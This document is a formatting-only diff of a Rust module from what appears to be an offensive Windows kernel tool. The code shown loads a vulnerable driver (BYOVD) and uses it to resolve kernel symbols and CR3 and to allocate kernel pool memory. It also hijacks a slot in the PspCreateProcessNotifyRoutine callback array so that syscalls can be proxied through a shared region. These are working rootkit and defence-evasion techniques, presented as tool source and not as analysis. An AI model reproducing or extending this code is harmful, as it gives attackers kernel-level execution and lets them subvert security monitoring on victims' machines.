@@ -66,11 +66,11 @@
 //! The shared memory region is allocated in kernel pool with `ExAllocatePool`
 //! via BYOVD, never from user-mode VirtualAlloc.
 
-use common::lock::MutexExt;
 use super::deploy::{self, DeployedDriver};
 use super::discover;
 use super::driver_db::VulnerableDriver;
 use anyhow::{bail, Context, Result};
+use common::lock::MutexExt;
 use serde::{Deserialize, Serialize};
 use std::sync::Mutex;
 
@@ -723,26 +723,19 @@ unsafe fn allocate_kernel_pool(
     // Resolve ExAllocatePool2 (Windows 10 2004+) or ExAllocatePoolWithTag.
     // ExAllocatePool2(Tag, Size, Tag) → PoolPtr
     // ExAllocatePoolWithTag(PoolType, Size, Tag) → PoolPtr
-    let pool_fn = discover::resolve_kernel_symbol(
-        driver,
-        device_handle,
-        kernel_base,
-        "ExAllocatePool2",
-    )
-    .or_else(|_| {
-        discover::resolve_kernel_symbol(
-            driver,
-            device_handle,
-            kernel_base,
-            "ExAllocatePoolWithTag",
-        )
-    })
-    .context("failed to resolve kernel pool allocator")?;
+    let pool_fn =
+        discover::resolve_kernel_symbol(driver, device_handle, kernel_base, "ExAllocatePool2")
+            .or_else(|_| {
+                discover::resolve_kernel_symbol(
+                    driver,
+                    device_handle,
+                    kernel_base,
+                    "ExAllocatePoolWithTag",
+                )
+            })
+            .context("failed to resolve kernel pool allocator")?;
 
-    tracing::debug!(
-        "proxy: resolved pool allocator at {:#x}",
-        pool_fn
-    );
+    tracing::debug!("proxy: resolved pool allocator at {:#x}", pool_fn);
 
     // We write a small allocation stub to a known-good kernel code location.
     // For safety, we use a small scratch area in the proxy region header's
@@ -848,17 +841,13 @@ pub fn init(session_key: &[u8]) -> Result<()> {
     let device_handle = deployed.device_handle.context("no device handle")?;
 
     // Step 2: Resolve kernel base and CR3.
-    let kernel_base = discover::get_kernel_base()
-        .context("proxy init: failed to resolve kernel base")?;
+    let kernel_base =
+        discover::get_kernel_base().context("proxy init: failed to resolve kernel base")?;
 
     let cr3 = super::resolve_cr3(driver, device_handle, kernel_base)
         .context("proxy init: failed to resolve CR3")?;
 
-    tracing::info!(
-        "proxy: kernel_base={:#x}, cr3={:#x}",
-        kernel_base,
-        cr3
-    );
+    tracing::info!("proxy: kernel_base={:#x}, cr3={:#x}", kernel_base, cr3);
 
     // Step 3: Allocate shared proxy region.
     let region_addr = unsafe {
@@ -932,7 +921,8 @@ pub fn init(session_key: &[u8]) -> Result<()> {
         }
     }
 
-    let slot_index = slot_index.context("no empty callback slot found in PspCreateProcessNotifyRoutine array")?;
+    let slot_index = slot_index
+        .context("no empty callback slot found in PspCreateProcessNotifyRoutine array")?;
 
     // Step 6: Resolve NT function addresses for the dispatch table.
     let mut fn_table = [0u64; NUM_SYSCALL_TYPES];
@@ -943,7 +933,11 @@ pub fn init(session_key: &[u8]) -> Result<()> {
                 fn_table[i] = addr;
             }
             Err(e) => {
-                tracing::warn!("proxy: failed to resolve {}: {:#} — ops using it will fail", name, e);
+                tracing::warn!(
+                    "proxy: failed to resolve {}: {:#} — ops using it will fail",
+                    name,
+                    e
+                );
             }
         }
     }
@@ -1066,31 +1060,19 @@ pub fn proxy_batch(batch: &ProxyBatch) -> Result<Vec<ProxyResult>> {
         for (i, op) in batch.ops.iter().enumerate() {
             let op_bytes = op.to_bytes();
             let offset = PROXY_HEADER_SIZE + i * PROXY_OP_SIZE;
-            std::ptr::copy_nonoverlapping(
-                op_bytes.as_ptr(),
-                region_ptr.add(offset),
-                PROXY_OP_SIZE,
-            );
+            std::ptr::copy_nonoverlapping(op_bytes.as_ptr(), region_ptr.add(offset), PROXY_OP_SIZE);
         }
 
         // Write op count.
         let count_bytes = (batch.ops.len() as u32).to_le_bytes();
-        std::ptr::copy_nonoverlapping(
-            count_bytes.as_ptr(),
-            region_ptr.add(0xC),
-            4,
-        );
+        std::ptr::copy_nonoverlapping(count_bytes.as_ptr(), region_ptr.add(0xC), 4);
 
         // Memory barrier to ensure all writes are visible before state change.
         std::sync::atomic::fence(std::sync::atomic::Ordering::Release);
 
         // Set state to Pending.
         let pending_bytes = (ProxyState::Pending as u32).to_le_bytes();
-        std::ptr::copy_nonoverlapping(
-            pending_bytes.as_ptr(),
-            region_ptr.add(8),
-            4,
-        );
+        std::ptr::copy_nonoverlapping(pending_bytes.as_ptr(), region_ptr.add(8), 4);
     }
 
     // Step 2: Poll for completion.
@@ -1137,8 +1119,7 @@ pub fn proxy_batch(batch: &ProxyBatch) -> Result<Vec<ProxyResult>> {
                 op_bytes.as_mut_ptr(),
                 PROXY_OP_SIZE,
             );
-            let op = ProxyOp::from_bytes(&op_bytes)
-                .context("failed to parse proxy result")?;
+            let op = ProxyOp::from_bytes(&op_bytes).context("failed to parse proxy result")?;
             results.push(ProxyResult {
                 status: op.status,
                 output: op.output,
@@ -1203,8 +1184,8 @@ pub fn shutdown(session_key: &[u8]) -> Result<()> {
     let device_handle = deployed.device_handle.context("no device handle")?;
 
     let cr3 = *PROXY_CR3.lock_recover();
-    let kernel_base = discover::get_kernel_base()
-        .context("shutdown: failed to resolve kernel base")?;
+    let kernel_base =
+        discover::get_kernel_base().context("shutdown: failed to resolve kernel base")?;
 
     // Zero the state in the shared region.
     if region_addr != 0 {
@@ -1233,10 +1214,7 @@ pub fn shutdown(session_key: &[u8]) -> Result<()> {
                 .context("shutdown: failed to clear callback slot")?;
         }
 
-        tracing::info!(
-            "proxy: unregistered callback at index {}",
-            slot_index
-        );
+        tracing::info!("proxy: unregistered callback at index {}", slot_index);
     }
 
     // Free user-mode shared region.
@@ -1359,7 +1337,10 @@ mod tests {
 
     #[test]
     fn test_proxy_magic() {
-        assert_eq!(PROXY_MAGIC, [b'O', b'R', b'K', b'P', b'R', b'X', b'0', b'1']);
+        assert_eq!(
+            PROXY_MAGIC,
+            [b'O', b'R', b'K', b'P', b'R', b'X', b'0', b'1']
+        );
     }
 
     #[test]
@@ -1407,8 +1388,10 @@ mod tests {
         // in sequence (simulating the dispatch queue).
         let ops: Vec<ProxyOp> = (0..10)
             .map(|i| {
-                let mut op =
-                    ProxyOp::new(SyscallType::NtAllocateVirtualMemory, [i, i + 1, i + 2, 0, 0, 0]);
+                let mut op = ProxyOp::new(
+                    SyscallType::NtAllocateVirtualMemory,
+                    [i, i + 1, i + 2, 0, 0, 0],
+                );
                 op.status = 0; // success
                 op.output = 0x1000 + i;
                 op
